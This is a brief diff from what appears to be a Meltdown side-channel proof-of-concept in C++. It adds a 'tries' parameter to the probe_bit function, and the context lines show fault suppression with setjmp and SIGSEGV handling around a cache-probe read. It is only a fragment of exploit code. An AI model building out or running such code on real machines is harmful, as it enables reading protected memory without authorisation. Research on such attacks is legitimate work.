@@ -25,7 +25,7 @@ void spectre::Meltdown::after() {
     signal(SIGSEGV, old_sigsegv_handler);
 }
 
-void spectre::Meltdown::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
+void spectre::Meltdown::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
     for (int i=0; i<100; i++) {
         if (!setjmp(signsegv_jmp)) {
             volatile uint8_t value;
